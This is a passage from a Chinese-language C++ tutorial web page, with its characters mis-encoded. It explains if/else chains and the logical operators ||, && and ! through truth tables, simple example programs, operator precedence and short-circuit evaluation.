class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (grade != <span class="string">&#x27;I&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Your grade is: &quot;</span> &lt;&lt; grade &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªä¾‹å­æ ¹æ®åˆ†æ•°èŒƒå›´åˆ¤æ–­å¯¹åº”çš„ç­‰çº§ã€‚ç¨‹åºä¼šæŒ‰é¡ºåºæ£€æŸ¥æ¡ä»¶ï¼Œä¸€æ—¦æ»¡è¶³ä¸€ä¸ªï¼ˆä¾‹å¦‚ <code>score &gt;= 80</code>ï¼‰ï¼Œå°±ä¼šç¡®å®šç­‰çº§ä¸º â€˜Bâ€™ï¼Œå¹¶è·³è¿‡åç»­çš„ <code>else if</code> å’Œ <code>else</code>ã€‚æœ€åçš„ <code>else</code> å¤„ç†æ‰€æœ‰ä½äº 60 åˆ†çš„æƒ…å†µã€‚</p><h2 id="6-2-é€»è¾‘è¡¨è¾¾å¼"><a href="#6-2-é€»è¾‘è¡¨è¾¾å¼" class="headerlink" title="6.2 é€»è¾‘è¡¨è¾¾å¼"></a>6.2 é€»è¾‘è¡¨è¾¾å¼</h2><p>åœ¨ <code>if</code> æˆ–å¾ªç¯çš„æ¡ä»¶ä¸­ï¼Œæˆ‘ä»¬å¸¸å¸¸éœ€è¦ç»„åˆå¤šä¸ªå…³ç³»è¡¨è¾¾å¼æˆ–è€…å¯¹æŸä¸ªæ¡ä»¶å–åã€‚<strong>é€»è¾‘è¿ç®—ç¬¦ (Logical Operators)</strong> ç”¨äºç»„åˆæˆ–ä¿®æ”¹å·²æœ‰çš„å¸ƒå°”è¡¨è¾¾å¼ï¼ˆæˆ–å¯ä»¥è½¬æ¢ä¸ºå¸ƒå°”å€¼çš„è¡¨è¾¾å¼ï¼‰ï¼Œç”Ÿæˆä¸€ä¸ªæ–°çš„å¸ƒå°”ç»“æœ (<code>true</code> æˆ– <code>false</code>)ã€‚</p><p>C++ ä¸»è¦æä¾›ä¸‰ç§é€»è¾‘è¿ç®—ç¬¦ï¼š</p><ul><li>  <strong>é€»è¾‘æˆ– (Logical OR): <code>||</code></strong></li><li>  <strong>é€»è¾‘ä¸ (Logical AND): <code>&amp;&amp;</code></strong></li><li>  <strong>é€»è¾‘é (Logical NOT): <code>!</code></strong></li></ul><h3 id="6-2-1-é€»è¾‘ORè¿ç®—ç¬¦ï¼š"><a href="#6-2-1-é€»è¾‘ORè¿ç®—ç¬¦ï¼š" class="headerlink" title="6.2.1 é€»è¾‘ORè¿ç®—ç¬¦ï¼š||"></a>6.2.1 é€»è¾‘ORè¿ç®—ç¬¦ï¼š||</h3><p>é€»è¾‘æˆ–è¿ç®—ç¬¦ <code>||</code> ç”¨äºè¿æ¥ä¸¤ä¸ªè¡¨è¾¾å¼ã€‚å¦‚æœ<strong>è‡³å°‘æœ‰ä¸€ä¸ª</strong>æ“ä½œæ•°ä¸º <code>true</code>ï¼Œåˆ™æ•´ä¸ª <code>||</code> è¡¨è¾¾å¼çš„ç»“æœä¸º <code>true</code>ã€‚åªæœ‰å½“<strong>ä¸¤ä¸ª</strong>æ“ä½œæ•°éƒ½ä¸º <code>false</code> æ—¶ï¼Œç»“æœæ‰ä¸º <code>false</code>ã€‚</p><p><strong>çœŸå€¼è¡¨:</strong></p><p>| æ“ä½œæ•°1 | æ“ä½œæ•°2 | <code>æ“ä½œæ•°1 || æ“ä½œæ•°2</code> |<br>| :â€”â€” | :â€”â€” | :â€”â€”â€”â€”â€”â€”- |<br>| <code>true</code>  | <code>true</code>  | <code>true</code>               |<br>| <code>true</code>  | <code>false</code> | <code>true</code>               |<br>| <code>false</code> | <code>true</code>  | <code>true</code>               |<br>| <code>false</code> | <code>false</code> | <code>false</code>              |</p><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><p><code>||</code> å¸¸ç”¨äºæ£€æŸ¥å¤šä¸ªæ¡ä»¶ä¸­æ˜¯å¦è‡³å°‘æœ‰ä¸€ä¸ªæ»¡è¶³ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> input_char;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter a character: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; input_char;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ£€æŸ¥å­—ç¬¦æ˜¯å¦æ˜¯å…ƒéŸ³å­—æ¯ (å¿½ç•¥å¤§å°å†™)</span></span><br><span class="line">    <span class="keyword">if</span> (input_char == <span class="string">&#x27;a&#x27;</span> || input_char == <span class="string">&#x27;e&#x27;</span> || input_char == <span class="string">&#x27;i&#x27;</span> || </span><br><span class="line">        input_char == <span class="string">&#x27;o&#x27;</span> || input_char == <span class="string">&#x27;u&#x27;</span> || input_char == <span class="string">&#x27;A&#x27;</span> || </span><br><span class="line">        input_char == <span class="string">&#x27;E&#x27;</span> || input_char == <span class="string">&#x27;I&#x27;</span> || input_char == <span class="string">&#x27;O&#x27;</span> || </span><br><span class="line">        input_char == <span class="string">&#x27;U&#x27;</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; input_char &lt;&lt; <span class="string">&quot;&#x27; is a vowel.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; input_char &lt;&lt; <span class="string">&quot;&#x27; is not a vowel.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> age = <span class="number">25</span>;</span><br><span class="line">    <span class="keyword">bool</span> has_ticket = <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">// æ£€æŸ¥æ˜¯å¦æ»¡è¶³å…¥åœºæ¡ä»¶ (å¹´é¾„å°äº 12 æˆ–æŒæœ‰é—¨ç¥¨)</span></span><br><span class="line">    <span class="keyword">if</span> (age &lt; <span class="number">12</span> || has_ticket) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Allowed entry.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Entry denied.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-2-2-é€»è¾‘ANDè¿ç®—ç¬¦ï¼š-amp-amp"><a href="#6-2-2-é€»è¾‘ANDè¿ç®—ç¬¦ï¼š-amp-amp" class="headerlink" title="6.2.2 é€»è¾‘ANDè¿ç®—ç¬¦ï¼š&amp;&amp;"></a>6.2.2 é€»è¾‘ANDè¿ç®—ç¬¦ï¼š&amp;&amp;</h3><p>é€»è¾‘ä¸è¿ç®—ç¬¦ <code>&amp;&amp;</code> ç”¨äºè¿æ¥ä¸¤ä¸ªè¡¨è¾¾å¼ã€‚åªæœ‰å½“<strong>ä¸¤ä¸ª</strong>æ“ä½œæ•°éƒ½ä¸º <code>true</code> æ—¶ï¼Œæ•´ä¸ª <code>&amp;&amp;</code> è¡¨è¾¾å¼çš„ç»“æœæ‰ä¸º <code>true</code>ã€‚åªè¦æœ‰<strong>è‡³å°‘ä¸€ä¸ª</strong>æ“ä½œæ•°ä¸º <code>false</code>ï¼Œç»“æœå°±ä¸º <code>false</code>ã€‚</p><p><strong>çœŸå€¼è¡¨:</strong></p><table><thead><tr><th align="left">æ“ä½œæ•°1</th><th align="left">æ“ä½œæ•°2</th><th align="left"><code>æ“ä½œæ•°1 &amp;&amp; æ“ä½œæ•°2</code></th></tr></thead><tbody><tr><td align="left"><code>true</code></td><td align="left"><code>true</code></td><td align="left"><code>true</code></td></tr><tr><td align="left"><code>true</code></td><td align="left"><code>false</code></td><td align="left"><code>false</code></td></tr><tr><td align="left"><code>false</code></td><td align="left"><code>true</code></td><td align="left"><code>false</code></td></tr><tr><td align="left"><code>false</code></td><td align="left"><code>false</code></td><td align="left"><code>false</code></td></tr></tbody></table><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><p><code>&amp;&amp;</code> å¸¸ç”¨äºæ£€æŸ¥æ˜¯å¦<strong>åŒæ—¶</strong>æ»¡è¶³å¤šä¸ªæ¡ä»¶ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">bool</span> has_id;</span><br><span class="line">    <span class="keyword">char</span> id_input;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your age: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; age;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Do you have an ID? (y/n): &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; id_input;</span><br><span class="line">    has_id = (id_input == <span class="string">&#x27;y&#x27;</span> || id_input == <span class="string">&#x27;Y&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ£€æŸ¥æ˜¯å¦æ»¡è¶³è´­ä¹°æ¡ä»¶ (å¹´é¾„å¤§äºç­‰äº 18 å¹¶ä¸”æŒæœ‰ ID)</span></span><br><span class="line">    <span class="keyword">if</span> (age &gt;= <span class="number">18</span> &amp;&amp; has_id) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Purchase approved.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Purchase denied.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">if</span> (age &lt; <span class="number">18</span>) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Reason: Underage.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!has_id) &#123; <span class="comment">// ä½¿ç”¨äº†é€»è¾‘é !</span></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Reason: No ID presented.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-2-3-ç”¨-amp-amp-æ¥è®¾ç½®å–å€¼èŒƒå›´"><a href="#6-2-3-ç”¨-amp-amp-æ¥è®¾ç½®å–å€¼èŒƒå›´" class="headerlink" title="6.2.3 ç”¨&amp;&amp;æ¥è®¾ç½®å–å€¼èŒƒå›´"></a>6.2.3 ç”¨&amp;&amp;æ¥è®¾ç½®å–å€¼èŒƒå›´</h3><p>é€»è¾‘ä¸è¿ç®—ç¬¦ <code>&amp;&amp;</code> éå¸¸é€‚åˆç”¨æ¥æ£€æŸ¥ä¸€ä¸ªå€¼æ˜¯å¦è½åœ¨æŸä¸ªç‰¹å®šçš„<strong>èŒƒå›´</strong>å†…ï¼ˆå³åŒæ—¶æ»¡è¶³å¤§äºæŸä¸ªå€¼å’Œå°äºå¦ä¸€ä¸ªå€¼ï¼‰ã€‚</p><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> score;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your score: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; score;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ£€æŸ¥åˆ†æ•°æ˜¯å¦åœ¨æœ‰æ•ˆèŒƒå›´ [0, 100] å†…</span></span><br><span class="line">    <span class="keyword">if</span> (score &gt;= <span class="number">0</span> &amp;&amp; score &lt;= <span class="number">100</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Score is valid.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="comment">// è¿›ä¸€æ­¥åˆ¤æ–­ç­‰çº§</span></span><br><span class="line">        <span class="keyword">if</span> (score &gt;= <span class="number">60</span> &amp;&amp; score &lt; <span class="number">70</span>) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Grade: D&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">70</span> &amp;&amp; score &lt; <span class="number">80</span>) &#123;</span><br><span class="line">             <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Grade: C&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ... å…¶ä»–ç­‰çº§åˆ¤æ–­</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Score is invalid (out of range 0-100).&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ£€æŸ¥ä¸€ä¸ªå­—ç¬¦æ˜¯å¦æ˜¯å¤§å†™å­—æ¯</span></span><br><span class="line">    <span class="keyword">char</span> ch = <span class="string">&#x27;Q&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (ch &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;Z&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; ch &lt;&lt; <span class="string">&quot;&#x27; is an uppercase letter.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„:</strong> ä¸èƒ½åƒæ•°å­¦ä¸­é‚£æ ·å†™ <code>0 &lt;= score &lt;= 100</code>ã€‚è¿™åœ¨ C++ ä¸­ä¼šè¢«è§£é‡Šä¸º <code>(0 &lt;= score) &lt;= 100</code>ã€‚<code>(0 &lt;= score)</code> çš„ç»“æœæ˜¯ <code>true</code> (1) æˆ– <code>false</code> (0)ï¼Œç„¶åè¿™ä¸ª 0 æˆ– 1 å†ä¸ 100 æ¯”è¾ƒï¼Œç»“æœå‡ ä¹æ€»æ˜¯ <code>true</code>ï¼Œæ— æ³•æ­£ç¡®åˆ¤æ–­èŒƒå›´ã€‚å¿…é¡»ä½¿ç”¨ <code>&amp;&amp;</code> è¿æ¥ä¸¤ä¸ªç‹¬ç«‹çš„æ¯”è¾ƒã€‚</p><h3 id="6-2-4-é€»è¾‘NOTè¿ç®—ç¬¦ï¼š"><a href="#6-2-4-é€»è¾‘NOTè¿ç®—ç¬¦ï¼š" class="headerlink" title="6.2.4 é€»è¾‘NOTè¿ç®—ç¬¦ï¼š!"></a>6.2.4 é€»è¾‘NOTè¿ç®—ç¬¦ï¼š!</h3><p>é€»è¾‘éè¿ç®—ç¬¦ <code>!</code> æ˜¯ä¸€ä¸ª<strong>ä¸€å…ƒ</strong>è¿ç®—ç¬¦ï¼ˆåªéœ€è¦ä¸€ä¸ªæ“ä½œæ•°ï¼‰ã€‚å®ƒå°†å…¶æ“ä½œæ•°çš„å¸ƒå°”å€¼<strong>å–å</strong>ï¼šå¦‚æœæ“ä½œæ•°ä¸º <code>true</code>ï¼Œç»“æœä¸º <code>false</code>ï¼›å¦‚æœæ“ä½œæ•°ä¸º <code>false</code>ï¼Œç»“æœä¸º <code>true</code>ã€‚</p><p><strong>çœŸå€¼è¡¨:</strong></p><table><thead><tr><th align="left">æ“ä½œæ•°</th><th align="left"><code>!æ“ä½œæ•°</code></th></tr></thead><tbody><tr><td align="left"><code>true</code></td><td align="left"><code>false</code></td></tr><tr><td align="left"><code>false</code></td><td align="left"><code>true</code></td></tr></tbody></table><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><p><code>!</code> ç”¨äºåè½¬ä¸€ä¸ªæ¡ä»¶çš„ç»“æœã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> is_raining = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">int</span> items_in_cart = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¦‚æœä¸æ˜¯åœ¨ä¸‹é›¨</span></span><br><span class="line">    <span class="keyword">if</span> (!is_raining) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;It&#x27;s not raining. Good day for a walk!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;It&#x27;s raining. Better stay inside.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ£€æŸ¥è´­ç‰©è½¦æ˜¯å¦ä¸ºç©º</span></span><br><span class="line">    <span class="comment">// items_in_cart == 0 ä¹Ÿå¯ä»¥ï¼Œä½† !items_in_cart æ›´ç®€æ´ (åˆ©ç”¨ 0 è½¬æ¢ä¸º false)</span></span><br><span class="line">    <span class="keyword">if</span> (!items_in_cart) &#123; </span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Your shopping cart is empty.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ£€æŸ¥ cin è¯»å–æ˜¯å¦å¤±è´¥</span></span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter a number: &quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!(<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; value)) &#123; <span class="comment">// å¦‚æœè¯»å–å¤±è´¥ (cin è½¬æ¢ä¸º false), !cin ä¸º true</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Invalid input or EOF.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You entered: &quot;</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-2-5-é€»è¾‘è¿ç®—ç¬¦ç»†èŠ‚"><a href="#6-2-5-é€»è¾‘è¿ç®—ç¬¦ç»†èŠ‚" class="headerlink" title="6.2.5 é€»è¾‘è¿ç®—ç¬¦ç»†èŠ‚"></a>6.2.5 é€»è¾‘è¿ç®—ç¬¦ç»†èŠ‚</h3><ol><li><p><strong>ä¼˜å…ˆçº§ (Precedence):</strong></p><ul><li><p>  é€»è¾‘é <code>!</code> å…·æœ‰æœ€é«˜çš„ä¼˜å…ˆçº§ï¼Œé«˜äºæ‰€æœ‰å…³ç³»è¿ç®—ç¬¦å’Œç®—æœ¯è¿ç®—ç¬¦ã€‚</p></li><li><p>  é€»è¾‘ä¸ <code>&amp;&amp;</code> çš„ä¼˜å…ˆçº§é«˜äºé€»è¾‘æˆ– <code>||</code>ã€‚</p></li><li><p>  é€»è¾‘è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§ä½äºå…³ç³»è¿ç®—ç¬¦ (<code>&lt;</code>, <code>==</code>, <code>!=</code> ç­‰)ã€‚</p></li><li><p>  èµ‹å€¼è¿ç®—ç¬¦ (<code>=</code>) ä¼˜å…ˆçº§æœ€ä½ã€‚</p></li><li><p>*å¸¸è§ä¼˜å…ˆçº§é¡ºåº (é«˜åˆ°ä½):**</p></li></ul><ol><li> <code>!</code></li><li> ç®—æœ¯è¿ç®—ç¬¦ (<code>*</code>, <code>/</code>, <code>%</code>, <code>+</code>, <code>-</code>)</li><li> å…³ç³»è¿ç®—ç¬¦ (<code>&lt;</code>, <code>&lt;=</code>, <code>&gt;</code>, <code>&gt;=</code>)</li><li> ç›¸ç­‰è¿ç®—ç¬¦ (<code>==</code>, <code>!=</code>)</li><li> é€»è¾‘ä¸ <code>&amp;&amp;</code></li><li> é€»è¾‘æˆ– <code>||</code></li><li> èµ‹å€¼è¿ç®—ç¬¦ (<code>=</code>, <code>+=</code> ç­‰)</li></ol><p> <strong>å»ºè®®:</strong> å½“ä¸ç¡®å®šä¼˜å…ˆçº§æˆ–ä¸ºäº†æé«˜å¯è¯»æ€§æ—¶ï¼Œ<strong>ä½¿ç”¨æ‹¬å· <code>()</code></strong> æ¥æ˜ç¡®æŒ‡å®šè¿ç®—é¡ºåºã€‚</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((age &gt;= <span class="number">18</span> &amp;&amp; age &lt; <span class="number">65</span>) || is_student) &#123; ... &#125; <span class="comment">// æ‹¬å·æ˜ç¡®äº† &amp;&amp; å…ˆäº ||</span></span><br></pre></td></tr></table></figure></li><li><p><strong>çŸ­è·¯æ±‚å€¼ (Short-Circuit Evaluation):</strong></p><ul><li><p>  <strong><code>&amp;&amp;</code> (é€»è¾‘ä¸):</strong> å¦‚æœ <code>&amp;&amp;</code> çš„<strong>å·¦ä¾§</strong>æ“ä½œæ•°è®¡ç®—ç»“æœä¸º <code>false</code>ï¼Œåˆ™<strong>å³ä¾§</strong>æ“ä½œæ•°<strong>ä¸ä¼š</strong>è¢«è®¡ç®—ã€‚å› ä¸ºæ— è®ºå³ä¾§æ˜¯ä»€ä¹ˆï¼Œæ•´ä¸ªè¡¨è¾¾å¼çš„ç»“æœéƒ½å¿…ç„¶æ˜¯ <code>false</code>ã€‚</p></li><li><p><strong><code>||</code> (é€»è¾‘æˆ–):</strong> å¦‚æœ <code>||</code> çš„<strong>å·¦ä¾§</strong>æ“ä½œæ•°è®¡ç®—ç»“æœä¸º <code>true</code>ï¼Œåˆ™<strong>å³ä¾§</strong>æ“ä½œæ•°<strong>ä¸ä¼š</strong>è¢«è®¡ç®—ã€‚å› ä¸ºæ— è®ºå³ä¾§æ˜¯ä»€ä¹ˆï¼Œæ•´ä¸ªè¡¨è¾¾å¼çš„ç»“æœéƒ½å¿…ç„¶æ˜¯ <code>true</code>ã€‚</p><p>çŸ­è·¯æ±‚å€¼éå¸¸é‡è¦ï¼Œå› ä¸ºå®ƒï¼š</p></li><li><p>  <strong>æé«˜æ•ˆç‡:</strong> é¿å…äº†ä¸å¿…è¦çš„è®¡ç®—ã€‚</p></li><li><p>  <strong>å…è®¸å®‰å…¨æ£€æŸ¥:</strong> å¯ä»¥åœ¨æ£€æŸ¥æŒ‡é’ˆæœ‰æ•ˆæ€§åæ‰è§£å¼•ç”¨å®ƒï¼Œæˆ–åœ¨é™¤æ•°éé›¶æ—¶æ‰æ‰§è¡Œé™¤æ³•ã€‚</p></li><li><p>*çŸ­è·¯æ±‚å€¼ç¤ºä¾‹:**</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 